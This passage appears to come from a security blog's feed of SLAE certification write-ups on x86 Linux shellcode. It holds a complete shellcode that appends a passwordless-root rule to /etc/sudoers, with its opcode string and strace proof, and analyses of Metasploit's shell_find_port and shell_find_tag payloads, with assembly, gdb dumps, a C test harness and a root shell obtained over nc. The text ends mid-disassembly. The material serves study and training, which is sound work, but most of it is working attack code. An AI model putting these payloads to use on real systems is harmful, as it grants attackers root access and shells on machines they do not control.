    pxor mm0, [ebp - 0x10]          ; /sud (xor with the previous result)
    movd [ebp - 0x10], mm0          ; overwrite result on the stack
    emms                            ; done with mmx, switch to x87
    push 0x6374652e                 ; .etc
    mov ebx, esp                    ; pathname
    inc byte [ebx]                  ; make the first character a slash
    push 0x20
    fild dword [esp]                ; load current value on the stack
    fmul st0                        ; multiply by itself
    fist dword [esp]                ; overwrite value on the stack
    pop ecx
    inc ecx                         ; flags (O_WRONLY | O_APPEND)
    or al, 0x5
    ; int open(const char *, int)
    int 0x80

    xchg ebx, eax                   ; move new file descriptor
    push edx                        ; nul character
    push 0x0a4c4c41                 ; ALL
    push 0x203a4457                 ; WD:
    push 0x53534150                 ; PASS
    push 0x4f4e2029                 ; ) NO
    push 0x4c4c4128                 ; (ALL
    push 0x3d4c4c41                 ; ALL=
    push 0x204c4c41                 ; ALL
    mov ecx, esp                    ; buf
    or dl, 0x1c                     ; count (28 bytes)
    push 0x2
    movss xmm0, [esp]
    addss xmm0, [esp]
    movd eax, xmm0
    ; ssize_t write(int, const void *, size_t)
    int 0x80
</code></pre>

<p>To partially build the filename, the MMX XOR functions were used with an initial XOR value. The resulting value serves as the XOR value to the next one:</p>

<pre><code>0xcafebabe ^ 0xb98cdfd1 = 0x7372656f ^ 0x17071640 = 0x6475732f
</code></pre>

<p>Following that, the <a href="https://c9x.me/x86/html/file_module_x86_id_77.html">emms</a> instruction is issued to signal the CPU that MMX operations are done and the shared registers are going to be used by the x87 FPU, which is going to be needed by the <a href="https://c9x.me/x86/html/file_module_x86_id_104.html">fmul</a> instruction to calculate the flags for the <a href="http://man7.org/linux/man-pages/man2/open.2.html">open(2)</a> system call:</p>

<pre><code>O_WRONLY | O_APPEND = 0x401 = (0x20 * 0x20) + 0x1
</code></pre>

<pre><code class="bash">$ make PROG=62
nasm  -f elf32 -o 62.o 62.asm
ld -N -zexecstack -o 62 62.o
08048080 &lt;_start&gt;:
 8048080:       54                      push   esp
 8048081:       5d                      pop    ebp
 8048082:       31 c0                   xor    eax,eax
 8048084:       99                      cdq
 8048085:       68 be ba fe ca          push   0xcafebabe
 804808a:       52                      push   edx
 804808b:       68 d1 df 8c b9          push   0xb98cdfd1
 8048090:       68 40 16 07 17          push   0x17071640
 8048095:       0f 6e 45 fc             movd   mm0,DWORD PTR [ebp-0x4]
 8048099:       0f ef 45 f4             pxor   mm0,QWORD PTR [ebp-0xc]
 804809d:       0f 7e 45 f4             movd   DWORD PTR [ebp-0xc],mm0
 80480a1:       0f ef 45 f0             pxor   mm0,QWORD PTR [ebp-0x10]
 80480a5:       0f 7e 45 f0             movd   DWORD PTR [ebp-0x10],mm0
 80480a9:       0f 77                   emms
 80480ab:       68 2e 65 74 63          push   0x6374652e
 80480b0:       89 e3                   mov    ebx,esp
 80480b2:       fe 03                   inc    BYTE PTR [ebx]
 80480b4:       6a 20                   push   0x20
 80480b6:       db 04 24                fild   DWORD PTR [esp]
 80480b9:       d8 c8                   fmul   st,st(0)
 80480bb:       db 14 24                fist   DWORD PTR [esp]
 80480be:       59                      pop    ecx
 80480bf:       41                      inc    ecx
 80480c0:       0c 05                   or     al,0x5
 80480c2:       cd 80                   int    0x80
 80480c4:       93                      xchg   ebx,eax
 80480c5:       52                      push   edx
 80480c6:       68 41 4c 4c 0a          push   0xa4c4c41
 80480cb:       68 57 44 3a 20          push   0x203a4457
 80480d0:       68 50 41 53 53          push   0x53534150
 80480d5:       68 29 20 4e 4f          push   0x4f4e2029
 80480da:       68 28 41 4c 4c          push   0x4c4c4128
 80480df:       68 41 4c 4c 3d          push   0x3d4c4c41
 80480e4:       68 41 4c 4c 20          push   0x204c4c41
 80480e9:       89 e1                   mov    ecx,esp
 80480eb:       80 ca 1c                or     dl,0x1c
 80480ee:       6a 02                   push   0x2
 80480f0:       f3 0f 10 04 24          movss  xmm0,DWORD PTR [esp]
 80480f5:       f3 0f 58 04 24          addss  xmm0,DWORD PTR [esp]
 80480fa:       66 0f 7e c0             movd   eax,xmm0
 80480fe:       cd 80                   int    0x80
Shellcode size: 128
\x54\x5d\x31\xc0\x99\x68\xbe\xba\xfe\xca\x52\x68\xd1\xdf\x8c\xb9\x68\x40\x16\x07\x17\x0f\x6e\x45\xfc\x0f\xef\x45\xf4\x0f\x7e\x45\xf4\x0f\xef\x45\xf0\x0f\x7e\x45\xf0\x0f\x77\x68\x2e\x65\x74\x63\x89\xe3\xfe\x03\x6a\x20\xdb\x04\x24\xd8\xc8\xdb\x14\x24\x59\x41\x0c\x05\xcd\x80\x93\x52\x68\x41\x4c\x4c\x0a\x68\x57\x44\x3a\x20\x68\x50\x41\x53\x53\x68\x29\x20\x4e\x4f\x68\x28\x41\x4c\x4c\x68\x41\x4c\x4c\x3d\x68\x41\x4c\x4c\x20\x89\xe1\x80\xca\x1c\x6a\x02\xf3\x0f\x10\x04\x24\xf3\x0f\x58\x04\x24\x66\x0f\x7e\xc0\xcd\x80
cc -DSHELLCODE=`asm-opcodes 62` -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
</code></pre>

<pre><code class="bash">(gdb) i r mm0
mm0            {uint64 = 0x7372656f, v2_int32 = {0x7372656f, 0x0}, v4_int16 = {0x656f, 0x7372, 0x0, 0x0}, v8_int8 = {0x6f, 0x65, 0x72, 0x73, 0x0, 0x0, 0x0, 0x0}}
(gdb) x/s $ebp-0xc
0xbffff640:     "oers"
(gdb) continue
Continuing.
Dump of assembler code for function shellcode:
   0x00402040 &lt;+0&gt;:     push   esp
   0x00402041 &lt;+1&gt;:     pop    ebp
   0x00402042 &lt;+2&gt;:     xor    eax,eax
   0x00402044 &lt;+4&gt;:     cdq
   0x00402045 &lt;+5&gt;:     push   0xcafebabe
   0x0040204a &lt;+10&gt;:    push   edx
   0x0040204b &lt;+11&gt;:    push   0xb98cdfd1
   0x00402050 &lt;+16&gt;:    push   0x17071640
   0x00402055 &lt;+21&gt;:    movd   mm0,DWORD PTR [ebp-0x4]
   0x00402059 &lt;+25&gt;:    pxor   mm0,QWORD PTR [ebp-0xc]
   0x0040205d &lt;+29&gt;:    movd   DWORD PTR [ebp-0xc],mm0
   0x00402061 &lt;+33&gt;:    pxor   mm0,QWORD PTR [ebp-0x10]
   0x00402065 &lt;+37&gt;:    movd   DWORD PTR [ebp-0x10],mm0
   0x00402069 &lt;+41&gt;:    emms
   0x0040206b &lt;+43&gt;:    push   0x6374652e
   0x00402070 &lt;+48&gt;:    mov    ebx,esp
   0x00402072 &lt;+50&gt;:    inc    BYTE PTR [ebx]
=&gt; 0x00402074 &lt;+52&gt;:    push   0x20
   0x00402076 &lt;+54&gt;:    fild   DWORD PTR [esp]
   0x00402079 &lt;+57&gt;:    fmul   st,st(0)
   0x0040207b &lt;+59&gt;:    fist   DWORD PTR [esp]
   0x0040207e &lt;+62&gt;:    pop    ecx
   0x0040207f &lt;+63&gt;:    inc    ecx
   0x00402080 &lt;+64&gt;:    or     al,0x5
   0x00402082 &lt;+66&gt;:    int    0x80
   0x00402084 &lt;+68&gt;:    xchg   ebx,eax
   0x00402085 &lt;+69&gt;:    push   edx
   0x00402086 &lt;+70&gt;:    push   0xa4c4c41
   0x0040208b &lt;+75&gt;:    push   0x203a4457
   0x00402090 &lt;+80&gt;:    push   0x53534150
   0x00402095 &lt;+85&gt;:    push   0x4f4e2029
   0x0040209a &lt;+90&gt;:    push   0x4c4c4128
   0x0040209f &lt;+95&gt;:    push   0x3d4c4c41
   0x004020a4 &lt;+100&gt;:   push   0x204c4c41
   0x004020a9 &lt;+105&gt;:   mov    ecx,esp
   0x004020ab &lt;+107&gt;:   or     dl,0x1c
   0x004020ae &lt;+110&gt;:   push   0x2
   0x004020b0 &lt;+112&gt;:   movss  xmm0,DWORD PTR [esp]
   0x004020b5 &lt;+117&gt;:   addss  xmm0,DWORD PTR [esp]
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
   0x004020ba &lt;+122&gt;:   movd   eax,xmm0
   0x004020be &lt;+126&gt;:   int    0x80
   0x004020c0 &lt;+128&gt;:   add    BYTE PTR [eax],al
End of assembler dump.
$22 = [ IF ]

Breakpoint 2, 0x00402074 in shellcode ()
(gdb) x/s $ebx
0xbffff638:     "/etc/sudoers"
(gdb) c
Continuing.
Dump of assembler code for function shellcode:
   0x00402040 &lt;+0&gt;:     push   esp
   0x00402041 &lt;+1&gt;:     pop    ebp
   0x00402042 &lt;+2&gt;:     xor    eax,eax
   0x00402044 &lt;+4&gt;:     cdq
   0x00402045 &lt;+5&gt;:     push   0xcafebabe
   0x0040204a &lt;+10&gt;:    push   edx
   0x0040204b &lt;+11&gt;:    push   0xb98cdfd1
   0x00402050 &lt;+16&gt;:    push   0x17071640
   0x00402055 &lt;+21&gt;:    movd   mm0,DWORD PTR [ebp-0x4]
   0x00402059 &lt;+25&gt;:    pxor   mm0,QWORD PTR [ebp-0xc]
   0x0040205d &lt;+29&gt;:    movd   DWORD PTR [ebp-0xc],mm0
   0x00402061 &lt;+33&gt;:    pxor   mm0,QWORD PTR [ebp-0x10]
   0x00402065 &lt;+37&gt;:    movd   DWORD PTR [ebp-0x10],mm0
   0x00402069 &lt;+41&gt;:    emms
   0x0040206b &lt;+43&gt;:    push   0x6374652e
   0x00402070 &lt;+48&gt;:    mov    ebx,esp
   0x00402072 &lt;+50&gt;:    inc    BYTE PTR [ebx]
   0x00402074 &lt;+52&gt;:    push   0x20
   0x00402076 &lt;+54&gt;:    fild   DWORD PTR [esp]
   0x00402079 &lt;+57&gt;:    fmul   st,st(0)
   0x0040207b &lt;+59&gt;:    fist   DWORD PTR [esp]
   0x0040207e &lt;+62&gt;:    pop    ecx
   0x0040207f &lt;+63&gt;:    inc    ecx
=&gt; 0x00402080 &lt;+64&gt;:    or     al,0x5
   0x00402082 &lt;+66&gt;:    int    0x80
   0x00402084 &lt;+68&gt;:    xchg   ebx,eax
   0x00402085 &lt;+69&gt;:    push   edx
   0x00402086 &lt;+70&gt;:    push   0xa4c4c41
   0x0040208b &lt;+75&gt;:    push   0x203a4457
   0x00402090 &lt;+80&gt;:    push   0x53534150
   0x00402095 &lt;+85&gt;:    push   0x4f4e2029
   0x0040209a &lt;+90&gt;:    push   0x4c4c4128
   0x0040209f &lt;+95&gt;:    push   0x3d4c4c41
   0x004020a4 &lt;+100&gt;:   push   0x204c4c41
   0x004020a9 &lt;+105&gt;:   mov    ecx,esp
   0x004020ab &lt;+107&gt;:   or     dl,0x1c
   0x004020ae &lt;+110&gt;:   push   0x2
   0x004020b0 &lt;+112&gt;:   movss  xmm0,DWORD PTR [esp]
   0x004020b5 &lt;+117&gt;:   addss  xmm0,DWORD PTR [esp]
---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---
   0x004020ba &lt;+122&gt;:   movd   eax,xmm0
   0x004020be &lt;+126&gt;:   int    0x80
   0x004020c0 &lt;+128&gt;:   add    BYTE PTR [eax],al
End of assembler dump.
$33 = [ IF ]

Breakpoint 5, 0x00402080 in shellcode ()
(gdb) i r ecx
ecx            0x401    1025
</code></pre>

<p>Executing the shellcode correctly appends the entry to the /etc/sudoers file:</p>

<pre><code class="bash"># tail -n1 /etc/sudoers; strace -e open,write ./shellcode; tail -n1 /etc/sudoers
#includedir /etc/sudoers.d
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
write(1, "Shellcode length: 128\n", 22Shellcode length: 128
) = 22
open("/etc/sudoers", O_WRONLY|O_APPEND) = 3
write(3, "ALL ALL=(ALL) NOPASSWD: ALL\n", 28) = 28
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x1c} ---
+++ killed by SIGSEGV +++
Segmentation fault
ALL ALL=(ALL) NOPASSWD: ALL
</code></pre>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[SLAE 0x05: Metasploit Payloads]]></title>
    <link href="http://tcunha.github.io/blog/2018/07/18/slae-0x05-metasploit-payloads/"/>
    <updated>2018-07-18T19:28:47+00:00</updated>
    <id>http://tcunha.github.io/blog/2018/07/18/slae-0x05-metasploit-payloads</id>
    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert

Student-ID: SLAE-1154
</code></pre>

<p>Instead of analysing the already done shellcodes in the previous exercises like the bind and reverse shells, I&rsquo;ve decided to pick the following three:</p>

<h3>1. linux/x86/shell_find_port</h3>

<p>This payload checks if a remote client is connecting from the configured TCP port by going through all file descriptors. In that circumstance, a shell is spawned:</p>

<pre><code class="asm">global _start

section .text
_start:
    xor ebx, ebx
    push ebx
    mov edi, esp                    ; save socket structure in the stack
    push byte +0x10                 ; 16 bytes in total
    push esp                        ; addrlen
    push edi                        ; addr
    push ebx                        ; sockfd
    mov ecx, esp                    ; args
    ; int getpeername(int, struct sockaddr *, socklen_t *)
    mov bl, 0x7                     ; call

port_restart:
    inc dword [ecx]                 ; increment getpeername(2) descriptor
    push byte +0x66
    ; int socketcall(int, unsigned long *)
    pop eax
    int 0x80

    cmp word [edi + 0x2], 0x9210    ; compare remote port with 4242/tcp
    jnz port_restart                ; remote port is different

    pop ebx                         ; pop the detected file descriptor value
    push byte +0x2                  ; start by redirecting stderr to it
    pop ecx
port_dup2_loop:
    mov al, 0x3f
    ; int dup2(int, int)
    int 0x80
    dec ecx                         ; redirect stdout and stdin, too
    jns port_dup2_loop              ; don't jump if ecx is positive

    push eax                        ; dup2(2) returned 0, push it
    push dword 0x68732f2f           ; //sh
    push dword 0x6e69622f           ; /bin
    mov ebx, esp                    ; filename
    push eax
    push ebx                        ; filename
    mov ecx, esp                    ; argv
    cdq                             ; set edx to zero as well
    mov al, 0xb
    ; int execve(const char *, char *const [], char *const [])
    int 0x80
</code></pre>

<p>The block up to the first interrupt is making use of the <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a> system call to retrieve the foreign protocol address associated with a socket by using <a href="http://man7.org/linux/man-pages/man2/getpeername.2.html">getpeername(2)</a>. The first expects the socket system call number in its first parameter and a memory region containing the respective system call arguments in the second parameter.</p>

<pre><code class="bash retrieving the system call number">$ asm-syscall socketcall
#define __NR_socketcall 102
0x66
</code></pre>

<pre><code class="c socketcall(2) prototype">int socketcall(int call, unsigned long *args);
</code></pre>

<pre><code class="bash getpeername(2) call number">$ grep -E "[^1-9]7" /usr/include/linux/net.h
#define SYS_GETPEERNAME 7               /* sys_getpeername(2)           */
</code></pre>

<pre><code>+----------+--------------------+
| register |       value        |
+----------+--------------------+
| eax      | 102                |
| ebx      | 7                  |
| ecx      | esp pointer        |
+----------+--------------------+
</code></pre>

<pre><code class="c getpeername(2) prototype">int getpeername(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
</code></pre>

<p>Like with <a href="http://man7.org/linux/man-pages/man2/accept.2.html">accept(2)</a>, this function passes a socket address structure from the kernel to the user process, thus one of its arguments is the socket structure size. This is a pointer since it is both a value when it is called and a result when returned. Its structure in memory will have the following layout:</p>

<pre><code>+-------------+
| 0x0         |&lt;-----+
+-------------+      |
| 0x10        |&lt;--+  |
+-------------+   |  |
| addrlen     |---+  |
+-------------+      |
| addr        |------+
+-------------+
| sockfd      |&lt;---- ecx
+-------------+
</code></pre>

<pre><code class="bash dissecting the first block">Dump of assembler code for function shellcode:
   0x00402060 &lt;+0&gt;:     xor    ebx,ebx
   0x00402062 &lt;+2&gt;:     push   ebx
   0x00402063 &lt;+3&gt;:     mov    edi,esp
   0x00402065 &lt;+5&gt;:     push   0x10
   0x00402067 &lt;+7&gt;:     push   esp
   0x00402068 &lt;+8&gt;:     push   edi
   0x00402069 &lt;+9&gt;:     push   ebx
   0x0040206a &lt;+10&gt;:    mov    ecx,esp
=&gt; 0x0040206c &lt;+12&gt;:    mov    bl,0x7
   0x0040206e &lt;+14&gt;:    inc    DWORD PTR [ecx]
   0x00402070 &lt;+16&gt;:    push   0x66
   0x00402072 &lt;+18&gt;:    pop    eax
   0x00402073 &lt;+19&gt;:    int    0x80
   0x00402075 &lt;+21&gt;:    cmp    WORD PTR [edi+0x2],0x9210
   0x0040207b &lt;+27&gt;:    jne    0x40206e &lt;shellcode+14&gt;
   0x0040207d &lt;+29&gt;:    pop    ebx
   0x0040207e &lt;+30&gt;:    push   0x2
   0x00402080 &lt;+32&gt;:    pop    ecx
   0x00402081 &lt;+33&gt;:    mov    al,0x3f
   0x00402083 &lt;+35&gt;:    int    0x80
   0x00402085 &lt;+37&gt;:    dec    ecx
   0x00402086 &lt;+38&gt;:    jns    0x402081 &lt;shellcode+33&gt;
   0x00402088 &lt;+40&gt;:    push   eax
   0x00402089 &lt;+41&gt;:    push   0x68732f2f
   0x0040208e &lt;+46&gt;:    push   0x6e69622f
   0x00402093 &lt;+51&gt;:    mov    ebx,esp
   0x00402095 &lt;+53&gt;:    push   eax
   0x00402096 &lt;+54&gt;:    push   ebx
   0x00402097 &lt;+55&gt;:    mov    ecx,esp
   0x00402099 &lt;+57&gt;:    cdq
   0x0040209a &lt;+58&gt;:    mov    al,0xb
   0x0040209c &lt;+60&gt;:    int    0x80
   0x0040209e &lt;+62&gt;:    add    BYTE PTR [eax],al
End of assembler dump.
$9 = [ PF ZF IF ]
0x0040206c in shellcode ()
(gdb) x/6x $esp
0xbffff588:     0x00000000      0xbffff598      0xbffff594      0x00000010
0xbffff598:     0x00000000      0x0040098a
(gdb) x/x $esp+4
0xbffff58c:     0xbffff598
(gdb) i r edi
edi             0xbffff598      -1073744488
(gdb) x/x $esp+8
0xbffff590:     0xbffff594
(gdb) x/x 0xbffff594
0xbffff594:     0x00000010
</code></pre>

<p>The next block of code is comprised of checking the remote TCP port for the current file descriptor. The sin_port member, as described in the first exercise, is 2 bytes from the start of the returned structure, and will be compared with 0x9210 (ie 4242/tcp). If the zero flag isn&rsquo;t set, the next file descriptor will be tried, by incrementing the memory location mentioned above.</p>

<p>In this scenario, the remote client will be assigned file descriptor 4, since file descriptors 0 through 2 are the standard ones, and the third is returned by <a href="http://man7.org/linux/man-pages/man2/socket.2.html">socket(2)</a>:</p>

<pre><code>+------+
| 0    | =&gt; stdin
| 1    | =&gt; stdout
| 2    | =&gt; stderr
| 3    | =&gt; fd
| 4    | =&gt; fd_client
+------+
</code></pre>

<pre><code class="bash dissecting the second block">Dump of assembler code for function shellcode:
   0x00402060 &lt;+0&gt;:     xor    ebx,ebx
   0x00402062 &lt;+2&gt;:     push   ebx
   0x00402063 &lt;+3&gt;:     mov    edi,esp
   0x00402065 &lt;+5&gt;:     push   0x10
   0x00402067 &lt;+7&gt;:     push   esp
   0x00402068 &lt;+8&gt;:     push   edi
   0x00402069 &lt;+9&gt;:     push   ebx
   0x0040206a &lt;+10&gt;:    mov    ecx,esp
   0x0040206c &lt;+12&gt;:    mov    bl,0x7
   0x0040206e &lt;+14&gt;:    inc    DWORD PTR [ecx]
   0x00402070 &lt;+16&gt;:    push   0x66
   0x00402072 &lt;+18&gt;:    pop    eax
   0x00402073 &lt;+19&gt;:    int    0x80
   0x00402075 &lt;+21&gt;:    cmp    WORD PTR [edi+0x2],0x9210
=&gt; 0x0040207b &lt;+27&gt;:    jne    0x40206e &lt;shellcode+14&gt;
   0x0040207d &lt;+29&gt;:    pop    ebx
   0x0040207e &lt;+30&gt;:    push   0x2
   0x00402080 &lt;+32&gt;:    pop    ecx
   0x00402081 &lt;+33&gt;:    mov    al,0x3f
   0x00402083 &lt;+35&gt;:    int    0x80
   0x00402085 &lt;+37&gt;:    dec    ecx
   0x00402086 &lt;+38&gt;:    jns    0x402081 &lt;shellcode+33&gt;
   0x00402088 &lt;+40&gt;:    push   eax
   0x00402089 &lt;+41&gt;:    push   0x68732f2f
   0x0040208e &lt;+46&gt;:    push   0x6e69622f
   0x00402093 &lt;+51&gt;:    mov    ebx,esp
   0x00402095 &lt;+53&gt;:    push   eax
   0x00402096 &lt;+54&gt;:    push   ebx
   0x00402097 &lt;+55&gt;:    mov    ecx,esp
   0x00402099 &lt;+57&gt;:    cdq
   0x0040209a &lt;+58&gt;:    mov    al,0xb
   0x0040209c &lt;+60&gt;:    int    0x80
   0x0040209e &lt;+62&gt;:    add    BYTE PTR [eax],al
End of assembler dump.
$13 = [ PF ZF IF ]

Breakpoint 2, 0x0040207b in shellcode ()
(gdb) x/x $ecx
0xbffff588:     0x00000004
(gdb) x/2b $edi+0x2
0xbffff59a:     0x10    0x92
</code></pre>

<p>The remaining of the code is the standard <a href="http://man7.org/linux/man-pages/man2/dup.2.html">dup2(2)</a> redirection of the usual file descriptors and calling <a href="http://man7.org/linux/man-pages/man2/execve.2.html">execve(2)</a> with /bin/sh. The following C program can be used to see the shellcode in action:</p>

<pre><code class="c">#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;

#include &lt;err.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;

#define QUOTE(s)        #s
#define STR(s)          QUOTE(s)

unsigned char shellcode[] = STR(SHELLCODE);

int
bind_try(struct addrinfo *p)
{
    int fd, yes = 1;

    if ((fd = socket(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol)) == -1) {
        warn("socket");
        return (-1);
    }
    if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &amp;yes, sizeof yes) == -1)
        err(1, "setsockopt");
    if (bind(fd, p-&gt;ai_addr, p-&gt;ai_addrlen) == -1) {
        close(fd);
        warn("bind");
        return (-1);
    }

    return (fd);
}

int
main(int argc, char **argv)
{
    char                     hbuf[NI_MAXHOST], sbuf[NI_MAXSERV];
    int                      ai_ret, fd, fd_client;
    socklen_t                sl_client;
    struct addrinfo          ai_hints;
    struct addrinfo         *ai_ptr, *ai_srv;
    struct sockaddr_storage  sa_client;

    if (argc != 2)
        errx(1, "usage: port");

    memset(&amp;ai_hints, 0, sizeof ai_hints);
    ai_hints.ai_family = AF_UNSPEC;
    ai_hints.ai_socktype = SOCK_STREAM;
    ai_hints.ai_flags = AI_PASSIVE;

    if ((ai_ret = getaddrinfo(NULL, argv[1], &amp;ai_hints, &amp;ai_srv)) != 0)
        errx(1, "getaddrinfo: %s", gai_strerror(ai_ret));
    for (ai_ptr = ai_srv; ai_ptr != NULL; ai_ptr = ai_ptr-&gt;ai_next) {
        if ((fd = bind_try(ai_ptr)) != -1)
            break;
    }
    if (ai_ptr == NULL)
        errx(1, "failed to bind");
    freeaddrinfo(ai_srv);
    sl_client = sizeof sa_client; 

    if (listen(fd, 5) == 1)
        err(1, "listen");
    fd_client = accept(fd, (struct sockaddr *) &amp;sa_client, &amp;sl_client);
    if (fd_client == -1)
        err(1, "accept");
    ai_ret = getnameinfo((struct sockaddr *) &amp;sa_client, sl_client, hbuf,
        sizeof hbuf, sbuf, sizeof sbuf, NI_NUMERICHOST | NI_NUMERICSERV);
    if (ai_ret != 0)
        errx(1, "getnameinfo: %s", gai_strerror(ai_ret));
    printf("Connection from %s:%s\n", hbuf, sbuf);

    (*(void(*)(void)) shellcode)();         /* Call the shellcode. */
    return (0);                             /* NOTREACHED */
}
</code></pre>

<pre><code class="bash">$ make PROG=shell-find-port
nasm  -f elf32 -o shell-find-port.o shell-find-port.asm
ld -N -zexecstack -o shell-find-port shell-find-port.o
08048080 &lt;_start&gt;:
 8048080:       31 db                   xor    ebx,ebx
 8048082:       53                      push   ebx
 8048083:       89 e7                   mov    edi,esp
 8048085:       6a 10                   push   0x10
 8048087:       54                      push   esp
 8048088:       57                      push   edi
 8048089:       53                      push   ebx
 804808a:       89 e1                   mov    ecx,esp
 804808c:       b3 07                   mov    bl,0x7

0804808e &lt;port_restart&gt;:
 804808e:       ff 01                   inc    DWORD PTR [ecx]
 8048090:       6a 66                   push   0x66
 8048092:       58                      pop    eax
 8048093:       cd 80                   int    0x80
 8048095:       66 81 7f 02 10 92       cmp    WORD PTR [edi+0x2],0x9210
 804809b:       75 f1                   jne    804808e &lt;port_restart&gt;
 804809d:       5b                      pop    ebx
 804809e:       6a 02                   push   0x2
 80480a0:       59                      pop    ecx

080480a1 &lt;port_dup2_loop&gt;:
 80480a1:       b0 3f                   mov    al,0x3f
 80480a3:       cd 80                   int    0x80
 80480a5:       49                      dec    ecx
 80480a6:       79 f9                   jns    80480a1 &lt;port_dup2_loop&gt;
 80480a8:       50                      push   eax
 80480a9:       68 2f 2f 73 68          push   0x68732f2f
 80480ae:       68 2f 62 69 6e          push   0x6e69622f
 80480b3:       89 e3                   mov    ebx,esp
 80480b5:       50                      push   eax
 80480b6:       53                      push   ebx
 80480b7:       89 e1                   mov    ecx,esp
 80480b9:       99                      cdq
 80480ba:       b0 0b                   mov    al,0xb
 80480bc:       cd 80                   int    0x80
Shellcode size: 62
\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x10\x92\x75\xf1\x5b\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
cc -DSHELLCODE=`asm-opcodes shell-find-port` -W -Wall -fno-stack-protector -zexecstack -o shellcode skel.c
</code></pre>

<p>Connecting from a random TCP port using <a href="https://man.openbsd.org/nc.1">nc(1)</a> is silently ignored, while from the configured one yields a shell:</p>

<pre><code class="bash"># ./shellcode 4243
Connection from 127.0.0.1:44050
Connection from 127.0.0.1:4242
$ ss -nlt|grep 4243
LISTEN     0      5            *:4243                     *:*
$ nc -v 127.0.0.1 4243
Connection to 127.0.0.1 4243 port [tcp/*] succeeded!
id
^C
$ nc -vp4242 127.0.0.1 4243
Connection to 127.0.0.1 4243 port [tcp/*] succeeded!
id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<h3>2. linux/x86/shell_find_tag</h3>

<p>This one is similar to the above, but instead of expecting a specific remote port on one of its file descriptors, it searches for a configured tag:</p>

<pre><code class="asm">global _start

section .text
_start:
    xor ebx, ebx
    push ebx
    mov esi, esp                    ; save buffer in the stack
    push byte +0x40                 ; flags (MSG_DONTWAIT)
    mov bh, 0xa                     ; 2560 bytes
    push ebx                        ; len
    push esi                        ; buf
    push ebx                        ; sockfd
    mov ecx, esp                    ; args
    ; ssize_t recv(int, void *, size_t, int)
    xchg bh, bl                     ; call (now 10 for recv(2))

tag_restart:
    inc word [ecx]                  ; increment recv(2) descriptor
    push byte +0x66
    ; int socketcall(int, unsigned long *)
    pop eax
    int 0x80

    cmp dword [esi], 0x45414c53     ; compare received tag with SLAE
    jnz tag_restart                 ; received buffer is different

    pop edi                         ; pop the detected file descriptor value
    mov ebx, edi                    ; fd
    push byte +0x2
    pop ecx                         ; start by redirecting stderr to it
tag_dup2_loop:
    push byte +0x3f
    ; int dup2(int, int)
    pop eax
    int 0x80
    dec ecx                         ; redirect stdout and stdin, too
    jns tag_dup2_loop               ; don't jump if ecx is positive

    push byte +0xb
    ; int execve(const char *, char *const [], char *const [])
    pop eax
    cdq                             ; set edx to zero, as well
    push edx
    push dword 0x68732f2f           ; //sh
    push dword 0x6e69622f           ; /bin
    mov ebx, esp                    ; filename
    push edx
    push ebx
    mov ecx, esp                    ; argv
    int 0x80
</code></pre>

<pre><code class="bash recv(2) call number">$ grep -E "[^1-9]10" /usr/include/linux/net.h
#define SYS_RECV        10              /* sys_recv(2)                  */
</code></pre>

<pre><code>+----------+--------------------+
| register |       value        |
+----------+--------------------+
| eax      | 102                |
| ebx      | 10                 |
| ecx      | esp pointer        |
+----------+--------------------+
</code></pre>

<pre><code class="c recv(2) prototype">ssize_t recv(int sockfd, void *buf, size_t len, int flags);
</code></pre>

<p>The <a href="http://man7.org/linux/man-pages/man2/recvmsg.2.html">recv(2)</a> system call will be used to receive a message from the file descriptors and save the received data on the stack. Its structure in memory will have the following layout:</p>

<pre><code>+-------------+
| 0x0         |&lt;-----+
+-------------+      |
| 0x40        |      |
+-------------+      |
| 0x0a00      |      |
+-------------+      |
| buf         |------+
+-------------+
| sockfd      |&lt;---- ecx
+-------------+
</code></pre>

<pre><code class="bash dissecting the first block">Dump of assembler code for function shellcode:
   0x00402080 &lt;+0&gt;:     xor    ebx,ebx
   0x00402082 &lt;+2&gt;:     push   ebx
   0x00402083 &lt;+3&gt;:     mov    esi,esp
   0x00402085 &lt;+5&gt;:     push   0x40
   0x00402087 &lt;+7&gt;:     mov    bh,0xa
   0x00402089 &lt;+9&gt;:     push   ebx
   0x0040208a &lt;+10&gt;:    push   esi
   0x0040208b &lt;+11&gt;:    push   ebx
   0x0040208c &lt;+12&gt;:    mov    ecx,esp
=&gt; 0x0040208e &lt;+14&gt;:    xchg   bl,bh
   0x00402090 &lt;+16&gt;:    inc    WORD PTR [ecx]
   0x00402093 &lt;+19&gt;:    push   0x66
   0x00402095 &lt;+21&gt;:    pop    eax
   0x00402096 &lt;+22&gt;:    int    0x80
   0x00402098 &lt;+24&gt;:    cmp    DWORD PTR [esi],0x45414c53
   0x0040209e &lt;+30&gt;:    jne    0x402090 &lt;shellcode+16&gt;
   0x004020a0 &lt;+32&gt;:    pop    edi
   0x004020a1 &lt;+33&gt;:    mov    ebx,edi
   0x004020a3 &lt;+35&gt;:    push   0x2
   0x004020a5 &lt;+37&gt;:    pop    ecx
   0x004020a6 &lt;+38&gt;:    push   0x3f
   0x004020a8 &lt;+40&gt;:    pop    eax
   0x004020a9 &lt;+41&gt;:    int    0x80
   0x004020ab &lt;+43&gt;:    dec    ecx
